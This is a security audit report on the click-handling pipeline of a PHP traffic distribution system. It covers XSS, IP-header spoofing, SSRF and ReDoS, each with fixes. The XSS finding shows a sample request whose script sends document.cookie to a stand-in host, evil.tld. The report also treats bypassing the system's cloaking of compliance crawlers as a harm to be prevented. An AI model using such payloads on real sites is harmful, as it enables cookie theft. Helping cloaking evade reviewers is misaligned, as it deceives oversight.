# Security Audit — Engine Hot Path

Scope: `src/Engine/ClickHandler.php` and the full `/<slug>` pipeline —
`MacroExpander`, `Engine/Schema/*` (15 schemas), `FilterCompiler`,
`VisitorResolver`, `Context`, `OfferPicker`, `GeoLookup`, `BotDetector`,
`DeviceDetector`, plus `Shared/RealIp.php` (feeds `Context::$ip`, in scope
because it's the direct upstream of GeoLookup/BotDetector/FilterCompiler/
MacroExpander). Read-only inspection — no code changed.

## Summary

| # | Finding | Severity |
|---|---|---|
| 1 | `MacroExpander` has no context-aware escaping → reflected XSS via `{referer}`/`{ua}`/`{lander_*}`/`{utm_*}` in raw-body schemas | High |
| 2 | `RealIp::from()` trusts client-supplied `X-Real-IP`/`X-Slim-IP`/`X-Forwarded-For` headers unconditionally, undermining bot/geo/rate-limit filtering | High |
| 3 | `CurlProxySchema` — TLS verification disabled, follows redirects with no host/protocol allowlist, no response-size cap | Medium |
| 4 | `X-Lander-Host`/`X-Lander-Path` accepted from any direct client, no trusted-proxy check → attribution/stats spoofing | Medium |
| 5 | `FilterCompiler` `regex` condition — ReDoS theoretically possible but pattern is admin-authored only | Low (N/A as attacker path) |
| 6 | Worker-mode cross-request state | Checked, no issue found |
| 7 | Open redirect via arbitrary query param | Checked, no issue found |
| 8 | `OfferPicker` / `GeoLookup` logic | Checked, no issue found |

Counts: **2 High, 1 Medium(+1 related Medium), 1 Low/N-A, 3 checked-clean.**

---

## 1. [HIGH] `MacroExpander` — no context-aware escaping → reflected XSS in raw-body schemas

**Files:** `src/Engine/MacroExpander.php:9-49`, `src/Engine/ClickHandler.php:96-102`,
`src/Engine/Schema/HtmlPageSchema.php:14-16`, `src/Engine/Schema/ShowTextSchema.php:14`,
`src/Engine/Schema/FormulaSchema.php:15-19`, `src/Engine/Schema/HttpCodeSchema.php:16-17`,
`src/Engine/Schema/JsonSchema.php:14-18`.

`MacroExpander::expand()` (line 9-16) is a single generic `preg_replace_callback` that
substitutes macro values as raw strings regardless of the destination context (URL query,
HTML body, JSON, plain text). `ClickHandler::handle()` calls `expand()` on
`schemaConfig['body']` and `schemaConfig['url']` (lines 97-102) *before* handing the config
to the schema — the schema itself just writes the already-expanded string to the response
body with zero further processing.

Several macros resolve directly to attacker-controlled request data with **no validation
or sanitization** (`MacroExpander::resolve()`, lines 20-48):
- `{referer}` → `Context::$referer` → raw `Referer` header (`ClickHandler.php:144-146`)
- `{ua}` → raw `User-Agent` header
- `{lander_host}` / `{lander_domain}` / `{lander_button}` → raw `X-Lander-Host` /
  `X-Lander-Path` headers, settable by any direct client (see finding 4)
- `{utm_source}`, `{utm_medium}`, `{utm_campaign}`, `{utm_term}`, `{utm_content}` → raw
  `?utm_*=` query parameters (`ClickHandler.php:172-177`)
- `{ip}` → resolved client IP (spoofable per finding 2, but restricted to `FILTER_VALIDATE_IP`
  format so not itself an injection vector)

Four schemas write the macro-expanded `body`/`config` value straight into the HTTP response
with **no `htmlspecialchars`/`json_encode` escaping at all**:
- `HtmlPageSchema::respond()` — `$response->getBody()->write($config['body'])`, `Content-Type: text/html`
- `ShowTextSchema::respond()` — same pattern, `Content-Type: text/plain` (lower risk — browsers
  won't execute script under `text/plain`, but see content-sniffing caveat below)
- `FormulaSchema::respond()` — same pattern, `Content-Type` itself is also operator-configurable
  and could be set to `text/html`
- `HttpCodeSchema::respond()` — writes `config['body']` raw with **no explicit `Content-Type`
  header at all**, so it inherits the framework/PSR-7 response default

By contrast, `MetaRefreshSchema`, `DoubleMetaRefreshSchema`, `JsRedirectSchema`, and
`IframeSchema` correctly `htmlspecialchars()` (and `JsRedirectSchema` additionally
`json_encode()`s) the URL before embedding it — proving the escaping discipline exists in
the codebase but is applied inconsistently, only to the single "target URL" value and not to
the general-purpose macro system.

**Exploit scenario:** An operator builds a schema-9 (HTML Page) or schema-15 (Formula) flow
with a body template that includes a macro for debugging/personalization, e.g.
`Thanks for visiting from {utm_content}` or a lander-attribution debug page that prints
`{lander_host}` / `{referer}`. This is precisely the intended use of these macros. An
attacker then requests:

```
GET /<slug>?utm_content="><script>document.location='https://evil.tld/c?'+document.cookie</script> HTTP/1.1
```

or sets `Referer: "><script>...</script>` / `X-Lander-Host: "><script>...</script>` (see
finding 4 — this header needs no trusted proxy). The macro expands to the raw attacker
string, which lands unescaped in the HTML response → JavaScript executes in the visitor's
browser under the TDS's own domain. Impact: phishing/defacement on the tracking domain,
fingerprint-evasion bypass, and (lower likelihood, since `vu` is `HttpOnly` per
`VisitorResolver::attachCookie`) social-engineering value if an admin previews/opens the
crafted click URL from the click log.

**`JsonSchema` note (behavioral, not directly XSS):** `JsonSchema.php:14-18` — if the
macro-expanded `body` fails `json_decode()` (e.g. because a macro value like `{referer}`
contains an unescaped `"`), the code silently serves the **raw, invalid string** with
`Content-Type: application/json` instead of erroring. Not an XSS vector under a correct
JSON content-type/no-sniff browser, but a data-integrity/format bug that can break
downstream integrations trusting well-formed JSON.

**Fix:**
- Give `MacroExpander::expand()` (or a wrapper) an explicit escaping mode
  (`Url`/`Html`/`Json`/`Raw`) applied per-macro-value at substitution time, not left to the
  operator to remember to wrap macros in escaping syntax (the DSL currently has no such
  syntax at all).
- At minimum, make `HtmlPageSchema`, `FormulaSchema`, and `HttpCodeSchema` HTML-escape
  `config['body']` by default (with an explicit opt-out for operators who intentionally want
  raw HTML/JS), matching the pattern already used by `MetaRefreshSchema`/`IframeSchema`.
- Give `HttpCodeSchema` an explicit `Content-Type` (currently unset) so it can't inherit an
  HTML-rendering default when a body is present.

---

## 2. [HIGH] `RealIp::from()` trusts spoofable client headers unconditionally

**File:** `src/Shared/RealIp.php:32-52`, consumed by `ClickHandler::buildContext()` line 140
and downstream by `GeoLookup::lookup()`, `BotDetector::detect()`,
`FilterCompiler`'s `ip_in_list`/`gt`/`lt` fields, and `MacroExpander`'s `{ip}` macro.

`RealIp::from()` walks `X-Slim-IP → X-Real-IP → CF-Connecting-IP → True-Client-IP →
X-Forwarded-For → REMOTE_ADDR` and returns the **first syntactically valid IP found in a raw
request header**, with no check that the request actually arrived through a trusted hop.
Caddy's `trusted_proxies`/`client_ip_headers` directive in `config/frankenphp/Caddyfile.cf`
only governs Caddy's own internal client-IP placeholders (logging, `{client_ip}`) — the
`php_server` directive still forwards the original, attacker-controllable
`X-Real-IP`/`X-Slim-IP`/`X-Forwarded-For` headers straight to PHP untouched; none of the
three Caddyfiles (`Caddyfile.cf`, `Caddyfile.direct`, `Caddyfile.dev`) strip or rewrite them.

**Exploit scenario:**
- `direct` deployment mode: there is no CDN in front — the public IP *is* the origin — so
  literally every request over the internet can set `X-Real-IP: <any IP>` and have it
  believed with zero prerequisite.
- `cf_flex`/`cf_full` mode: both prod compose files publish `80:80`/`443:443` on all
  interfaces, so if the origin IP is ever discovered (DNS history, certificate-transparency
  logs, a non-proxied DNS record, Shodan), an attacker hitting the origin directly bypasses
  Cloudflare and can forge `CF-Connecting-IP`/`X-Real-IP` freely — `RealIp` has no
  server-side re-validation against the actual TCP peer (`REMOTE_ADDR`, which Caddy *does*
  correctly protect via its own `trusted_proxies`).

**Impact:** this defeats every IP-keyed control in the hot path: `BotDetector` stages 1/2a/2b
(`core.bot_ips`/`bot_cidrs`/`bot_asns`) become opt-out for anyone who adds one header — a
compliance crawler or competitor sends a clean residential IP and sees the "real" offer
instead of the cloaked fallback. `RATE_LIMIT_IP` and the admin-login lockout become
bypassable by rotating the spoofed header per request. `GeoLookup`-driven country/region flow
targeting and reporting become spoofable, corrupting both traffic routing and stats
integrity. The code comment on `RealIp.php:26-28` explicitly acknowledges this ("not a
security boundary") but `BotDetector`/`FilterCompiler`/rate-limiting elsewhere in the app use
`Context::$ip` as exactly that.

**Fix:** only honor `X-Real-IP`/`X-Slim-IP`/`CF-Connecting-IP`/`True-Client-IP`/
`X-Forwarded-For` when the request's actual `REMOTE_ADDR` (server param, which Caddy does
protect) is itself within the configured trusted-proxy range for the active `DEPLOY_MODE`;
otherwise fall back straight to `REMOTE_ADDR`. For `direct` mode, none of these headers
should be trusted unless the operator explicitly fronts the box with their own reverse proxy
that they control. Additionally, firewall inbound 80/443 to Cloudflare's published ranges at
the OS level when `DEPLOY_MODE=cf_*`, since Caddy-level trust config alone can't prevent
direct-origin access. (This same finding was independently flagged in
`docs/audit/deployment.md` finding 1 — consistent with this pass.)

---

## 3. [MEDIUM] `CurlProxySchema` — SSRF-adjacent surface, TLS disabled, unrestricted redirects

**File:** `src/Engine/Schema/CurlProxySchema.php:12-34`.

```php
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
```

- `CURLOPT_SSL_VERIFYPEER` is unconditionally disabled → the outbound fetch to the offer/
  config URL is vulnerable to MITM; a network attacker between the TDS host and the offer can
  substitute the response, which is then served to the visitor as if from the TDS's own
  domain (`Content-Type` is taken from the spoofed response too, line 28).
- `CURLOPT_FOLLOWLOCATION` is enabled with no `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS`
  restriction and no post-redirect host validation. In the normal case `$url` is an
  operator-configured offer URL (trusted), but per finding 1 the same `schemaConfig['url']`
  passes through `MacroExpander::expand()` first (`ClickHandler.php:100-102`) — if an
  operator's template embeds `{referer}`, `{ua}`, or `{lander_host}` in the URL (a plausible
  personalization use, e.g. building a proxied "smart link" per traffic source), the visitor
  gains full or partial control of the fetch target, enabling classic SSRF to
  `169.254.169.254` (cloud metadata), internal Docker service ports, or `file://` (if the
  linked libcurl build permits it — not restricted here).
- No `CURLOPT_MAXFILESIZE`/response-size cap combined with `CURLOPT_RETURNTRANSFER => true`
  — a large upstream response is buffered fully in memory, a potential memory-exhaustion
  vector if an offer/redirect target returns a very large body.

**Fix:** re-enable `CURLOPT_SSL_VERIFYPEER`/`VERIFYHOST`; set
`CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` to `CURLPROTO_HTTP|CURLPROTO_HTTPS`; resolve
and reject private/loopback/link-local ranges before `curl_init` and again after any redirect
(standard SSRF-guard pattern); cap `CURLOPT_MAXFILESIZE`. Independently of the SSRF-guard,
disallow the visitor-influenced macros (`{referer}`, `{ua}`, `{lander_*}`, `{utm_*}`) from
being usable inside `config['url']` specifically for this schema, or validate the fully
expanded URL against an operator-configured host allowlist before fetching.

---

## 4. [MEDIUM] `X-Lander-Host`/`X-Lander-Path` accepted with no trusted-source check

**File:** `src/Engine/ClickHandler.php:151-169`.

The comment documents that these headers are meant to be set only by "SEO-sites' nginx"
proxying `/play/<button>/` through to the engine. But `buildContext()` reads them straight
off the incoming PSR-7 request with no check that the request came from that trusted nginx
(no shared-secret/HMAC, no IP allowlist, no reuse of the `RealIp`/trusted-proxy concept). The
`/<slug>` route is necessarily public, so any client can set these headers directly on a
request to the engine, regardless of whether it went through a lander at all.

**Impact:** attribution/statistics poisoning (fabricated `lander_host`/`lander_button` in
`stats.clicks` and in the AI-source Telegram notification path,
`ClickHandler::notifyIfAiSourced`), and — combined with finding 1 — an additional unescaped
injection point into any schema body/URL that uses `{lander_host}`/`{lander_domain}`/
`{lander_button}`.

**Fix:** accept these headers only when the request's (trust-boundary-validated) source IP
matches an allowlist of the operator's own SEO-site nginx hosts, or HMAC-sign the header pair
on the nginx side and verify the signature here.

---

## 5. [LOW / effectively N/A] `FilterCompiler` regex condition — ReDoS

**File:** `src/Engine/FilterCompiler.php:63`.

```php
'regex' => static fn (Context $ctx): bool => is_string($v = $extract($ctx))
    && @preg_match('/' . str_replace('/', '\/', (string)$value) . '/i', $v) === 1,
```

`$value` (the pattern) originates only from `core.flows.filters` JSONB, written exclusively
through `Admin\Form\FlowForm`/`FlowController`, which sit behind the full `/admin`
middleware stack (Session → Locale → Csrf → RateLimit → Auth →
PasswordChangeRequired — confirmed via `config/routes.php` and grep across `src/Admin`).
No public code path writes into `flows.filters`. So this is **not attacker-reachable** in
the threat model of an anonymous visitor; it requires a malicious or careless authenticated
operator, at which point they already have far more direct capabilities (editing offer URLs,
flow bodies, etc.). The subject-string `$v` being visitor-controlled (`referer`, `ua`, etc.)
means a *careless* admin-authored pattern with catastrophic backtracking would run per
matching click, but that's a self-inflicted operational risk, not a security boundary
violation. `@preg_match(...) === 1` correctly treats compile failure/no-match as `false` —
no logic bug.

**Recommendation (low priority):** validate patterns at flow-save time against a
complexity/backtracking budget or a short list of adversarial test strings, purely as an
operational safety net — not a security fix.

---

## 6. [INFO] Worker-mode cross-request state — checked, no issue found

This was treated as the highest-priority check given FrankenPHP's resident-process worker
mode (`config/frankenphp/worker.php` loops `frankenphp_handle_request()` up to
`FRANKENPHP_MAX_REQUESTS` times per worker without re-bootstrapping).

- `Context` (`src/Engine/Context.php`) is instantiated fresh per request —
  `new Context($ip, $ua, $slug, time())` in `ClickHandler::buildContext()` (line 142) — never
  cached, pooled, or stored as a service property. Each request gets its own object; no
  visitor's `Context` can be read by a later request handled by the same worker.
- `VisitorResolver`, `MacroExpander`, `OfferPicker`, `BotDetector`, `DeviceDetector`,
  `GeoLookup` — none hold per-visitor instance state. They take `Context $ctx` as a method
  parameter and mutate *that* object, never a property on `$this`.
- `GeoLookup` caches the MaxMind `Reader` handles (`$countryReader`/`$cityReader`/
  `$asnReader`) as instance properties (lines 12-14) — these are stateless file-backed
  readers with no per-visitor data, so reuse across requests inside the same worker instance
  is a safe, intentional performance optimization, not a leak.
- `FilterCompiler::$cache` (line 12) memoizes **compiled closures keyed by a hash of the
  filter configuration** (flow-level, not visitor-level). The closures close over `$groups`/
  `$preds`/`$extract`/`$value` — all derived purely from the filter config — and accept
  `Context $ctx` as a call-time parameter, never captured by reference. No visitor data is
  baked into a cached closure.
- `FlowMatcher::$cache` (line 12-14, `src/Engine/FlowMatcher.php`) memoizes the *list of
  flows* per campaign for 60 seconds — again config-level, not visitor-level, data.
- DI (`config/di.php`, not re-read line-by-line here but consistent with `CLAUDE.md`'s
  description) registers Engine services via `autowire()`, which PHP-DI treats as
  shared/singleton within the container — meaning one instance per worker process, matching
  the pattern above: safe *because* none of these singletons carry per-request state in a
  property, only immutable config-derived caches.

No static properties, superglobals, or singleton fields anywhere in `src/Engine/*` hold
visitor-identifying data (`visitor_uuid`, `ip`, resolved offer URL, etc.) between requests.

## 7. [INFO] Open redirect via arbitrary query parameter — checked, no issue found

`MacroExpander::resolve()`'s `match` is a fixed whitelist (`country`, `region`, `city`,
`device`, `os`, `browser`, `bot`, `lang`, `ip`, `ua`, `referer`, `click_id`, `visitor_uuid`,
`campaign_slug`, `lander_host`, `lander_domain`, `lander_button`, `timestamp`, `utm_*`,
`rand`, `randstr`, `spin`) — there is no `{query:*}`-style macro or any other mechanism that
lets an arbitrary `?param=` value substitute for or extend the redirect target's host. Every
macro that reflects visitor input reflects a *fixed, named* field, not an operator-selectable
raw query key. A visitor cannot introduce a brand-new macro name via the query string, and
none of the fixed macros expose "whatever the visitor put in any parameter I choose." Open
redirect via query-string is not present.

## 8. [INFO] `OfferPicker` / `GeoLookup` — quick pass, no issue found

- `OfferPicker::pick()` — weighted-random (`random_int`) for non-sticky rotation, consistent
  `xxh3` hash of `visitor_uuid` mod total-weight for sticky selection. `xxh3` is a
  non-cryptographic hash, which is fine here — it's a load-distribution function, not an
  access-control or unpredictability guarantee. No logic bug (zero-weight/empty-id candidates
  correctly skipped; degenerate `$sum === 0` returns `null`; final fallback to last valid
  candidate correctly handles floating-point-free integer rounding at the boundary).
- `GeoLookup::lookup()` — validates `$ip` with `FILTER_VALIDATE_IP` before passing to MaxMind
  readers; catches `AddressNotFoundException` per-lookup; silently no-ops when `.mmdb` files
  are absent (`city()`/`asn()` return `null`, matching the documented behavior). No logic bug
  found.

---

## Not audited (explicitly out of scope for this pass)

Admin auth/session/CSRF, Pixel (`/p.js`, `/p/event`) and Postback controllers, Docker/deploy
configuration beyond what was needed to evaluate `RealIp`/Caddyfile header handling (already
covered by `docs/audit/deployment.md`) — see those audits for that ground.
